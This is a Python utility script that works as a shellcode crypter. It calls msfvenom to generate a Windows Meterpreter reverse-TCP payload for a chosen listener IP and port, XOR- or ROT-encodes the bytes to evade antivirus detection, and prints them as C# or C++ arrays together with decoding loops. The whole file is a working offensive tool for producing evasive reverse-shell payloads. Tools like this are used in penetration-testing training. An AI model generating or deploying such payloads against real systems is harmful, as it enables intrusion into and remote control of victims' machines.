#!/usr/bin/python3

# Basic shellcode crypter for C# payloads
# By Cas van Cooten

import re
import platform
import argparse
import subprocess
from random import randint

if platform.system() != "Linux":
    exit("[x] ERROR: Only Linux is supported for this utility script.")

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Parse input arguments
def auto_int(x):
    return int(x, 0)

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use")
parser.add_argument("format", help="the language to format the output in ('cs' or 'cpp')", nargs='?', default="cs")
parser.add_argument("encoding", help="the encoding type to use ('xor' or 'rot')", nargs='?', default="xor")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")

# Format the output payload
if args.format == "cs": 
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        payload[i] = "{0:#0{1}x}".format(byteInt,4)

    payLen = len(payload)
    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    payloadFormatted = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in CSharp format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (CSharp):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
    }}"""

    if args.encoding == "rot":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);
    }}"""

    print(decodingFunc)

elif args.format == "cpp":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    encodedPayload = []
    for byte in payload:
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        encodedPayload.append(f"\\x{byteInt:02x}")

    payLen = len(encodedPayload)
    payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
    payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in C++ format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (C++):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});
        """

    if args.encoding == "rot":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);
        """

    print(decodingFunc)

else:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid formatting type (choose 'cs' for CSharp or 'cpp' for C++).{bcolors.ENDC}")